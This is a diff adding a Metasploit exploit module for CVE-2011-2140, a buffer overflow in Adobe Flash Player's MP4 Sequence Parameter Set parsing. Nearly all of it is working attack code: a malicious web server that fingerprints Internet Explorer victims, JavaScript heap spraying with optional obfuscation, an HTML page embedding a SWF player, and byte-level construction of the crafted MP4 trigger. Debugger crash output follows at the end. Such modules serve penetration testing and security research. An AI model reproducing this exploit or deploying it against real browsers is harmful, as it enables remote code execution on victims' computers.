@@ -1,0 +1,326 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = NormalRanking
+
+	include Msf::Exploit::Remote::HttpServer::HTML
+
+	def initialize(info={})
+		super(update_info(info,
+			'Name'           => "Adobe Flash Player MP4 SequenceParameterSetNALUnit Buffer Overflow",
+			'Description'    => %q{
+					This module exploits a vulnerability found in Adobe Flash Player's Flash10u.ocx
+				component.  When processing a MP4 file (specifically the Sequence Parameter Set),
+				Flash will see if pic_order_cnt_type is equal to 1, which sets the
+				num_ref_frames_in_pic_order_cnt_cycle field, and then blindly copies data in
+				offset_for_ref_frame on the stack, which allows arbitrary remote code execution
+				under the context of the user.  Numerous reports also indicate that this
+				vulnerability has been exploited in the wild.
+
+					Please note that the exploit requires a SWF media player in order to trigger
+				the bug, which currently isn't included in the framework.  However, software such
+				as Longtail SWF Player is free for non-commercial use, and is easily obtainable.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'Alexander Gavrun', #RCA
+					'Abysssec',         #PoC
+					'sinn3r'            #Metasploit
+				],
+			'References'     =>
+				[
+					[ 'CVE', '2011-2140' ],
+					[ 'BID', '49083' ],
+					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-276/' ],
+					[ 'URL', 'http://www.kahusecurity.com/2011/cve-2011-2140-caught-in-the-wild/' ],
+					[ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb11-21.html' ],
+					[ 'URL', 'http://0x1byte.blogspot.com/2011/11/analysis-of-cve-2011-2140-adobe-flash.html' ],
+					[ 'URL', 'http://www.abysssec.com/blog/2012/01/31/exploiting-cve-2011-2140-another-flash-player-vulnerability/' ]
+				],
+			'Payload'        =>
+				{
+					'BadChars'        => "\x00",
+					'StackAdjustment' => -3500
+				},
+			'DefaultOptions'  =>
+				{
+					'ExitFunction'         => "seh",
+					'InitialAutoRunScript' => 'migrate -f'
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'Automatic', {} ],
+					[ 'IE 6 on Windows XP SP3',         { 'Offset' => '0x600' } ], #0x5f4 = spot on
+					[ 'IE 7 on Windows XP SP3 / Vista', { 'Offset' => '0x600' } ]
+				],
+			'Privileged'     => false,
+			'DisclosureDate' => "Aug 9 2011",
+			'DefaultTarget'  => 0))
+
+			register_options(
+				[
+					OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation']),
+					OptString.new('SWF_PLAYER_URI', [true, 'Path to the SWF Player'])
+				], self.class)
+	end
+
+	def get_target(agent)
+		#If the user is already specified by the user, we'll just use that
+		return target if target.name != 'Automatic'
+
+		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
+			return targets[1]
+		elsif agent =~ /MSIE 7/
+			return targets[2]
+		else
+			return nil
+		end
+	end
+
+	def on_request_uri(cli, request)
+		agent = request.headers['User-Agent']
+		my_target = get_target(agent)
+
+		# Avoid the attack if the victim doesn't have the same setup we're targeting
+		if my_target.nil?
+			print_error("Browser not supported, will not launch attack: #{agent.to_s}: #{cli.peerhost}:#{cli.peerport}")
+			send_not_found(cli)
+			return
+		end
+
+		# The SWF requests our MP4 trigger
+		if request.uri =~ /\.mp4$/
+			print_status("Sending MP4 to #{cli.peerhost}:#{cli.peerport}...")
+			#print_error("Sorry, not sending you the mp4 for now")
+			#send_not_found(cli)
+			send_response(cli, @mp4, {'Content-Type'=>'video/mp4'})
+			return
+		end
+
+		# Set payload depending on target
+		p = payload.encoded
+
+		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
+		js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
+
+		js = <<-JS
+		var heap_obj = new heapLib.ie(0x20000);
+		var code = unescape("#{js_code}");
+		var nops = unescape("#{js_nops}");
+
+		while (nops.length < 0x80000) nops += nops;
+		var offset = nops.substring(0, #{my_target['Offset']});
+		var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
+
+		while (shellcode.length < 0x40000) shellcode += shellcode;
+		var block = shellcode.substring(0, (0x80000-6)/2);
+
+		heap_obj.gc();
+
+		for (var i=1; i < 0x300; i++) {
+			heap_obj.alloc(block);
+		}
+		JS
+
+		js = heaplib(js, {:noobfu => true})
+
+		if datastore['OBFUSCATE']
+			js = ::Rex::Exploitation::JSObfu.new(js)
+			js.obfuscate
+		end
+
+		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']
+		mp4_uri = "http://#{myhost}:#{datastore['SRVPORT']}#{get_resource()}/#{rand_text_alpha(rand(6)+3)}.mp4"
+		swf_uri = "#{datastore['SWF_PLAYER_URI']}?autostart=true&image=video.jpg&file=#{mp4_uri}"
+
+		html = %Q|
+		<html>
+		<head>
+		<script>
+		#{js}
+		</script>
+		</head>
+		<body>
+		<object width="1" height="1" type="application/x-shockwave-flash" data="#{swf_uri}">
+		<param name="movie" value="#{swf_uri}">
+		</object>
+		</body>
+		</html>
+		|
+
+		html = html.gsub(/^\t\t/, '')
+
+		print_status("Sending html to #{cli.peerhost}:#{cli.peerport}...")
+		send_response(cli, html, {'Content-Type'=>'text/html'})
+	end
+
+	def exploit
+		@mp4 = create_mp4
+		super
+	end
+
+	def create_mp4
+		ftypAtom = "\x00\x00\x00\x20"                   #Size
+		ftypAtom << "ftypisom"
+		ftypAtom << "\x00\x00\x02\x00"
+		ftypAtom << "isomiso2avc1mp41"
+
+		mdatAtom = "\x00\x00\x00\x10"                   #Size
+		mdatAtom << "mdat"
+		mdatAtom << "\x00\x00\x02\x8B\x06\x05\xFF\xFF"
+
+		moovAtom1 = "\x00\x00\x08\x83"                  #Size
+		moovAtom1 << "moov"                             #Move header box header
+		moovAtom1 << "\x00\x00\x00"
+		moovAtom1 << "lmvhd"                            # Type
+		moovAtom1 << "\x00\x00\x00\x00"                 # Version/Flags
+		moovAtom1 << "\x7C\x25\xB0\x80\x7C\x25\xB0\x80" # Creation time
+		moovAtom1 << "\x00\x00\x03\xE8"                 # Time scale
+		moovAtom1 << "\x00\x00\x2F\x80"                 # Duration
+		moovAtom1 << "\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		moovAtom1 << "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00"
+		moovAtom1 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x02\xFA"
+		moovAtom1 << "trak"                             # Track box header
+		moovAtom1 << "\x00\x00\x00\x5C"
+		moovAtom1 << "tkhd"
+		moovAtom1 << "\x00\x00\x00\x0F"
+		moovAtom1 << "\x7C\x25\xB0\x80\x7C\x25\xB0\x80"  # Creation time
+		moovAtom1 << "\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x2E\xE0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		moovAtom1 << "\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		moovAtom1 << "\x00\x00\x00\x00\x40\x00\x00\x00\x01\x42\x00\x00\x01\x42\x00\x00\x00\x00\x02"
+		moovAtom1 << "rmdia"
+		moovAtom1 << "\x00\x00\x00\x20"                  # Size
+		moovAtom1 << "mdhd"                              # Media header box
+		moovAtom1 << "\x00\x00\x00\x00"                  # Version/Flags
+		moovAtom1 << "\x7C\x25\xB0\x80\x7C\x25\xB0\x80"  # Creation time
+		moovAtom1 << "\x00\x00\x00\x01"                  # Time scale
+		moovAtom1 << "\x00\x00\x00\x0C"                  # Duration
+		moovAtom1 << "\x55\xC4\x00\x00"
+		moovAtom1 << "\x00\x00\x00\x2D"                  # Size
+		moovAtom1 << "hdlr"                              # Handler Reference header
+		moovAtom1 << "\x00\x00\x00\x00\x00\x00\x00\x00"
+		moovAtom1 << "vide"                              # Handler type
+		moovAtom1 << "\x00\x00\x00\x00\x00"
+		moovAtom1 << "\x00\x00\x00\x00\x00\x00\x00"
+		moovAtom1 << "VideoHandler"                      # Handler name
+		moovAtom1 << "\x00\x00\x00\x02\x1D"
+		moovAtom1 << "minf"
+		moovAtom1 << "\x00\x00\x00\x14"
+		moovAtom1 << "vmhd"
+		moovAtom1 << "\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24"
+		moovAtom1 << "dinf"                              # Data information box header
+		moovAtom1 << "\x00\x00\x00\x1c"
+		moovAtom1 << "dref"                              # Data reference box
+		moovAtom1 << "\x00\x00\x00\x00\x00\x00\x00\x01"
+		moovAtom1 << "\x00\x00\x00\x0C"                  # Size
+		moovAtom1 << "url "                              # Data entry URL box
+		moovAtom1 << "\x00\x00\x00\x01"                  # Location / version / flags
+		moovAtom1 << "\x00\x00\x09\xDD"                  # Size
+		moovAtom1 << "stbl"
+		moovAtom1 << "\x00\x00\x08\x99"
+		moovAtom1 << "stsd"
+		moovAtom1 << "\x00\x00\x00\x00\x00\x00\x00\x01"
+		moovAtom1 << "\x00\x00\x08\x89"                  # Size
+		moovAtom1 << "avc1"
+		moovAtom1 << "\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		moovAtom1 << "\x01\x42"                          # Width
+		moovAtom1 << "\x01\x42"                          # Height
+		moovAtom1 << "\x00\x48\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		moovAtom1 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		moovAtom1 << "\x18"                              # Depth
+		moovAtom1 << "\xFF\xFF"
+		moovAtom1 << "\x00\x00\x08\x33"                  # Size
+		moovAtom1 << "avcC"
+		moovAtom1 << "\x01"                              # Config version
+		moovAtom1 << "\x64"                              # Avc profile indication
+		moovAtom1 << "\x00"                              # Compatibility
+		moovAtom1 << "\x15"                              # Avc level indication
+		moovAtom1 << "\xFF\xE1"
+
+		# Although the fields have different values, they all become 0x0c0c0c0c
+		# in memory.
+		cycle =  "\x00\x00\x00"
+		cycle << "\x30\x30\x30\x30"  #6th
+		cycle << "\x00\x00\x00"
+		cycle << "\x18\x18\x18\x18"  #7th
+		cycle << "\x00\x00\x00"
+		cycle << "\x0c\x0c\x0c\x0c"  #8th
+		cycle << "\x00\x00\x00"
+		cycle << "\x06\x06\x06\x06"  #1st
+		cycle << "\x00\x00\x00"
+		cycle << "\x03\x03\x03\x03"
+		cycle << "\x00\x00\x00\x01\x81\x81\x81\x80\x00\x00\x00"
+		cycle << "\xc0\xc0\xc0\xc0"  # 4th
+		cycle << "\x00\x00\x00"
+		cycle << "\x60\x60\x60\x60"
+
+		spsunit =  "\x08\x1A\x67\x70\x34\x32\x74\x70\x00\x00\xAF\x88\x88\x84\x00\x00\x03\x00\x04\x00\x00\x03\x00\x3F\xFF\xFF\xFF\xFF\xFF"
+		spsunit << "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"
+		spsunit << "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFC"
+		spsunit << cycle * 35
+		spsunit << "\x00\x00\x00\x30\x30\x03\x03\x03\x03\x00\x00\x00\xB2\x2C"
+
+		moovAtom2 = "\x00\x00\x00\x18"
+		moovAtom2 << "stts"
+		moovAtom2 << "\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0C\x00\x00\x00\x01"
+		moovAtom2 << "\x00\x00\x00\x14"
+		moovAtom2 << "stss"
+		moovAtom2 << "\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
+		moovAtom2 << "pctts"
+		moovAtom2 << "\x00\x00\x00\x00\x00\x00"
+		moovAtom2 << "\x00\x0C\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
+		moovAtom2 << "\x01\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x02"
+		moovAtom2 << "\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x01\x00"
+		moovAtom2 << "\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x02"
+		moovAtom2 << "\x00\x00\x00\x1C"
+		moovAtom2 << "stsc"
+		moovAtom2 << "\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
+		moovAtom2 << "\x00\x00\x00\x44"
+		moovAtom2 << "stsz"
+		moovAtom2 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		moovAtom2 << "\x0C\x00\x00\x2F\x8D\x00\x00\x0C\xFE\x00\x00\x04\x42\x00\x00\x0B\x20\x00\x00\x04\x58\x00\x00\x07\x19\x00\x00\x07"
+		moovAtom2 << "\x63\x00\x00\x02\xD6\x00\x00\x03\xC1\x00\x00\x0A\xDF\x00\x00\x04\x9B\x00\x00\x09\x39"
+		moovAtom2 << "\x00\x00\x00\x40"
+		moovAtom2 << "stco"
+		moovAtom2 << "\x00\x00\x00\x00\x00\x00\x00\x0C\x00\x00\x00\x30\x00\x00\x2F\xBD\x00\x00\x3D\x8A\x00\x00\x48\x19\x00\x00\x5A\xF4"
+		moovAtom2 << "\x00\x00\x66\x1F\x00\x00\x73\xEA\x00\x00\x82\x32\x00\x00\x8A\xFA\x00\x00\x95\x51\x00\x00\xA7\x16\x00\x00\xB1\xE5"
+
+		moovAtom = moovAtom1 + spsunit + moovAtom2
+		m = ftypAtom + mdatAtom + moovAtom
+		return m
+	end
+
+end
+
+=begin
+C:\WINDOWS\system32\Macromed\Flash\Flash10u.ocx
+
+Flash10u+0x5b4e8:
+Missing image name, possible paged-out or corrupt data.
+1f06b4e8 8901            mov     dword ptr [ecx],eax  ds:0023:020c0000=00905a4d
+0:008> !exchain
+020bfdfc: <Unloaded_ud.drv>+c0c0c0b (0c0c0c0c)
+
+ECX points to 0x0c0c0c0c at the time of the crash:
+0:008> r
+eax=00000000 ebx=00000000 ecx=0c0c0c0c edx=7c9032bc esi=00000000 edi=00000000
+eip=0c0c0c0c esp=020befa8 ebp=020befc8 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00050246
+<Unloaded_ud.drv>+0xc0c0c0b:
+0c0c0c0c ??              ???
+
+Example of SWF player URI:
+http://www.jeroenwijering.com/embed/mediaplayer.swf
+
+To-do:
+IE 8 target
+=end
